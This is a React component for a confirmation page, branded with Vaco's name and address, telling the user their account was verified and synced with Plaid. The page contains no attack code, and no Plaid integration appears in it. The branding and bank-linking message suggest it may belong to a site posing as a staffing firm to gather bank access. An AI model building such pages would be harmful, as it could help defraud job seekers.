import React, { useState, useEffect } from 'react';
import './home.css';

import moment from 'moment';
import { useNavigate,Link , useLocation} from 'react-router-dom';


import logo from './logo.svg';
import social from './social.png';
import footer from './footer.svg';


import {db, auth, storage} from './firebase';

import axios from 'axios'

import { collection, getDocs, where, query, doc, setDoc,deleteDoc } from "firebase/firestore";
import hero from './hero.jpeg';
import { ref, uploadBytes, getDownloadURL } from "firebase/storage";


import Swal from 'sweetalert2';



function Complete(){


    const location  = useLocation();
    const navigate = useNavigate();


   
    


    // useEffect(() => {
       
    //     // window.location.reload();
    
      
    
    //   }, []); 


    //   application data

    
 
    

    return(
        <>
             <nav className="navbar containerr navbar-expand-lg navbar-light">
                <a className="navbar-brand" href="/"><img className='mylogo' src={logo}/></a>
                <button className="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
                    <span className="navbar-toggler-icon"></span>
                </button>
                <div className="collapse navbar-collapse" id="navbarNavAltMarkup">
                    <div className="navbar-nav ml-auto">
                   
                    <a className="nav-link mx-3" href="/">Home</a>
                    {/* <a className="nav-link mx-3" href="">About Us</a>
                    <a className="nav-link mx-3" href="#">Job Openings</a>
                    <a className="nav-link mx-3"href="#">For Veterans</a> */}
                    
                    </div>
                </div>
                </nav>

                    <br></br>
                <div className='herodivtwo py-5'>
                   
                </div>


               
              




                <div className='col-md-10 m-auto'>
                   

                 

                 <div className='card col-md-6 m-auto px-4 py-2 rounded'>

                     <div className='text-center'>
                     

                <h4 className='intro'>Verification Successful </h4>
                     </div>


                     <div className='cardtwo col-11 rounded shadow m-auto py-2'>

                     <h5 className='topic'>Account Connected </h5>
<p className='topicpara'>You have successfully sync your account with Plaid.</p>

                         
<h5 className='topic'>Your data belongs to you</h5>
<p className='topicpara'>Plaid doesn't sell personal info and will only use it with your permission</p>
</div>


          

            

                 </div>


               
                  

                 
             


               



    



               
               
                </div>


                <hr className='footerhr mt-5' />

                 <section className='footer containerr'>

                     <img className='mylogo' src={footer} />

                     <div>
                         <p className='small'>©2024 Vaco | All Rights Reserved</p>
                         <p className='small'>Vaco Global Headquarters: 5501 Virginia Way #120, Brentwood, TN 37027</p>
                         <p className='small'><a>Privacy policy</a> | <a>Fraud Policy</a> | <a>EEO Notice</a></p>
                     </div>


                    <img className='social'src={social} />
                 </section>



                 
                

        </>
    );
}

export default Complete;